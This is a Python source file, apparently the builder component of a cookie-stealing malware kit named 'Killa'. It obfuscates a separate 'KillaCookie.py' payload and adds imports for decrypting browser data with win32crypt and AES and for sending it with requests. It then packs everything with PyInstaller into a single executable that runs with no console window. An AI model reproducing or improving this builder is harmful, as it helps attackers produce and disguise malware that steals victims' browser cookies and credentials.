## Credits to https://github.com/Fadi002/HyperBreak , go check him out , prolly one of the best obf out there right now

import sys 
import os
import shutil
import time


from colorama import Fore
from src import *

OBFUSCATE = HyperBreak_obf

class build:

    def __init__(self,obf) -> None:
         
        if obf == 'yes':
             self.obfbuild()
        else: 
            self.build()
    
    def print015(self,text):
        for c in text:
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.030)
        sys.stdout.write("\n")
    
    
    def build(self):
        
        self.print015(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.WHITE} -> Name?')
        name = input(f'{Fore.MAGENTA}> ')
        
        if name == '':
            name = 'build'
        
        try:
            os.system(f'python -m PyInstaller --onefile --name {name} --noconsole --clean  build.py')
        except:
            self.print015(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.RED} -> No pyinstaller found, hit enter to install now')
            input()
            os.system('pip install pyinstaller')
        
        try:
            shutil.rmtree('build')
        except:pass
        
        self.print015(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.GREEN} + File built !')
        input(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.WHITE} -> Press enter to exit')
    
    def obfbuild(self):
        
        code = OBFUSCATE('utils/KillaCookie.py',rename=True)
        imports = '''
import json
import base64
import os
import shutil
import sqlite3
import requests
from pathlib import Path
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from win32crypt import CryptUnprotectData
       
        '''
        with open(f"build.py",'a',encoding='utf8') as f:
            f.write(imports)
            f.write(code)
        
        self.print015(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.WHITE} -> Name?')
        name = input(f'{Fore.MAGENTA}> ')
        
        if name == '':
            name = 'build'
        
        try:
            os.system(f'python -m PyInstaller --onefile --name {name} --noconsole --clean  build.py')
        except:
            self.print015(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.RED} -> No pyinstaller found, hit enter to install now')
            input()
            os.system('pip install pyinstaller')
            
        
        try:
            shutil.rmtree('build')
        except:pass
        
        self.print015(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.GREEN} + File built !')
        input(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.WHITE} -> Press enter to exit')

